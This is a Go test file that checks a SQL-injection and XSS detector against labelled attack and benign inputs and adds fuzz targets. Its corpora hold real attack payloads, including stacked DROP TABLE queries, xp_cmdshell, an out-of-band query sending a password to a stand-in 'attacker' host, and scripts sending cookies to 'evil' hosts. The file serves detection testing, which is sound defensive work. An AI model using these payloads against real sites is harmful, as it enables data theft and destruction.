// Package middleware: corpus-based true-positive fuzz tests for the
// libinjection SQLi/XSS detector.
//
// The existing fuzz tests assert only "no panic" — they don't verify
// that known-malicious payloads are actually detected. This file
// adds a labelled corpus of real attack strings and asserts each one
// is caught by DetectSQLi / DetectXSS.
package middleware

import "testing"

// sqliCorpus is a small but representative set of true-positive SQLi
// payloads sourced from OWASP, PortSwigger, and real incident reports.
// Each entry MUST be detected by DetectSQLi.
var sqliCorpus = []string{
	// Classic tautologies
	"' OR '1'='1",
	"' OR 1=1--",
	"admin'--",
	"admin' OR '1'='1'--",
	"' OR 1=1#",
	"') OR ('1'='1",
	// UNION-based
	"' UNION SELECT NULL--",
	"' UNION SELECT 1,2,3--",
	"' UNION ALL SELECT username,password FROM users--",
	"1' UNION SELECT @@version--",
	// Boolean blind
	"' AND 1=1--",
	"' AND 1=2--",
	"1' AND (SELECT COUNT(*) FROM users) > 0--",
	// Time-based blind
	"1'; WAITFOR DELAY '0:0:5'--",
	"1' AND SLEEP(5)--",
	"1' AND BENCHMARK(1000000,MD5('A'))--",
	// Stacked queries
	"1'; DROP TABLE users--",
	"1'; DELETE FROM users WHERE 1=1--",
	"1'; INSERT INTO users VALUES('hacker','pwd')--",
	// Information schema probing
	"' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
	// PostgreSQL-specific
	"1'::int",
	"$$;DROP TABLE users;$$",
	// Out-of-band
	"'; exec xp_cmdshell('whoami')--",
	"' AND UTL_HTTP.request('http://attacker/'||(SELECT password FROM users WHERE rownum=1))--",
	// Bypass attempts
	"' /*!50000OR*/ 1=1--",
	"' %0aOR 1=1--",
	"' oR 1=1--",
	"' /*!OR*/ 1=1--",
	"' AnD 1=1--",
	// Encoded
	"%27%20OR%201%3D1--",
	"' /*!50000%53ELECT*/ 1--",
}

// xssCorpus is a small but representative set of true-positive XSS
// payloads. Each entry MUST be detected by DetectXSS.
var xssCorpus = []string{
	// Script tags
	"<script>alert(1)</script>",
	"<SCRIPT>alert(1)</SCRIPT>",
	"<script src='http://evil/x.js'></script>",
	"<script>document.location='http://evil/?c='+document.cookie</script>",
	// Event handlers
	"<img src=x onerror=alert(1)>",
	"<svg onload=alert(1)>",
	"<body onload=alert(1)>",
	"<input onfocus=alert(1) autofocus>",
	"<div onmouseover=alert(1)>x</div>",
	"<iframe src='javascript:alert(1)'></iframe>",
	// JavaScript protocol
	"<a href='javascript:alert(1)'>x</a>",
	"<a href=\"JaVaScRiPt:alert(1)\">x</a>",
	"<a href='vbscript:msgbox(1)'>x</a>",
	// Data URIs
	"<a href='data:text/html,<script>alert(1)</script>'>x</a>",
	"<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
	// Dangerous tags
	"<iframe src='http://evil/'></iframe>",
	"<object data='http://evil/'></object>",
	"<embed src='http://evil/'>",
	"<svg><animate onbegin=alert(1) attributeName=x></svg>",
	// Encoded
	"&lt;script&gt;alert(1)&lt;/script&gt;",
	"<svg/onload=alert(1)>",
	"<svg/////onload=alert(1)>",
	// Template injection
	"{{constructor.constructor('alert(1)')()}}",
	"${alert(1)}",
	// Document access
	"<script>document.cookie</script>",
	"<script>document.location='http://evil/?c='+document.cookie</script>",
	"<script>fetch('http://evil/?'+document.cookie)</script>",
	// Modern evasion
	"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
	"<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(1)>",
	"<svg><animateTransform onbegin=alert(1)>",
}

// benignCorpus is a set of inputs that MUST NOT be flagged as SQLi or
// XSS. This is the false-positive test side.
var benignCorpus = []string{
	"normal search query",
	"john's laptop",
	"email me at jane@example.com",
	"<p>plain html paragraph</p>",
	"https://example.com/path?q=hello world",
	"hello world 123",
	"user_id=42",
	"version 1.2.3-rc1",
	"the < and > characters in text",
	"San Francisco, CA",
	"O'Brien",
	"100% organic",
	"a < b && c > d",
}

// TestSQLiCorpus asserts that every entry in sqliCorpus is detected by
// DetectSQLi. Fails the build if any attack string slips through.
func TestSQLiCorpus(t *testing.T) {
	missed := 0
	for _, p := range sqliCorpus {
		if !DetectSQLi(p) {
			t.Errorf("SQLi not detected: %q", p)
			missed++
		}
	}
	if missed > 0 {
		t.Logf("SQLi detection rate: %d/%d (%.1f%%)", len(sqliCorpus)-missed, len(sqliCorpus), 100*float64(len(sqliCorpus)-missed)/float64(len(sqliCorpus)))
	}
}

// TestXSSCorpus asserts that every entry in xssCorpus is detected by
// DetectXSS.
func TestXSSCorpus(t *testing.T) {
	missed := 0
	for _, p := range xssCorpus {
		if !DetectXSS(p) {
			t.Errorf("XSS not detected: %q", p)
			missed++
		}
	}
	if missed > 0 {
		t.Logf("XSS detection rate: %d/%d (%.1f%%)", len(xssCorpus)-missed, len(xssCorpus), 100*float64(len(xssCorpus)-missed)/float64(len(xssCorpus)))
	}
}

// TestBenignCorpus asserts that no entry in benignCorpus is falsely
// flagged.
func TestBenignCorpus(t *testing.T) {
	for _, p := range benignCorpus {
		if DetectSQLi(p) {
			t.Errorf("benign flagged as SQLi: %q", p)
		}
		if DetectXSS(p) {
			t.Errorf("benign flagged as XSS: %q", p)
		}
	}
}

// FuzzDetectSQLiCorpus is a Go native fuzz target that asserts
// true-positive detection on a seed corpus of known SQLi strings.
// Unlike the existing FuzzDetectSQLi (which only checks no-panic),
// this one also checks that the input is detected whenever it matches
// a canonical SQLi pattern. Operators can run with
// `go test -fuzz=FuzzDetectSQLiCorpus -fuzztime=30s`.
func FuzzDetectSQLiCorpus(f *testing.F) {
	for _, p := range sqliCorpus {
		f.Add(p)
	}
	f.Fuzz(func(t *testing.T, input string) {
		_ = DetectSQLi(input)
		if isLikelySQLiShape(input) && !DetectSQLi(input) {
			t.Errorf("likely SQLi not detected: %q", input)
		}
	})
}

// FuzzDetectXSSCorpus is a Go native fuzz target that asserts
// true-positive detection.
func FuzzDetectXSSCorpus(f *testing.F) {
	for _, p := range xssCorpus {
		f.Add(p)
	}
	f.Fuzz(func(t *testing.T, input string) {
		_ = DetectXSS(input)
		if isLikelyXSSShape(input) && !DetectXSS(input) {
			t.Errorf("likely XSS not detected: %q", input)
		}
	})
}

// isLikelySQLiShape returns true when the input matches a coarse SQLi
// signature: contains a single-quote AND a SQL keyword in the same
// string. Used by the fuzz target to assert true-positive detection
// without overwhelming the test with the full corpus.
func isLikelySQLiShape(s string) bool {
	low := toLower(s)
	hasQuote := false
	for _, c := range low {
		if c == '\'' {
			hasQuote = true
			break
		}
	}
	if !hasQuote {
		return false
	}
	keywords := []string{"union", "select", "or", "and", "drop", "insert", "delete", "update", "--", "#"}
	for _, k := range keywords {
		if containsCI(low, k) {
			return true
		}
	}
	return false
}

func isLikelyXSSShape(s string) bool {
	low := toLower(s)
	// Script tag (open or close) OR event handler OR javascript: protocol
	if containsCI(low, "<script") || containsCI(low, "</script") {
		return true
	}
	if containsCI(low, "onerror=") || containsCI(low, "onload=") || containsCI(low, "onclick=") {
		return true
	}
	if containsCI(low, "javascript:") {
		return true
	}
	if containsCI(low, "data:text/html") {
		return true
	}
	return false
}

func containsCI(s, sub string) bool {
	if len(sub) > len(s) {
		return false
	}
	for i := 0; i+len(sub) <= len(s); i++ {
		match := true
		for j := 0; j < len(sub); j++ {
			a, b := s[i+j], sub[j]
			if a >= 'A' && a <= 'Z' {
				a += 32
			}
			if b >= 'A' && b <= 'Z' {
				b += 32
			}
			if a != b {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}

func toLower(s string) string {
	b := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		b[i] = c
	}
	return string(b)
}
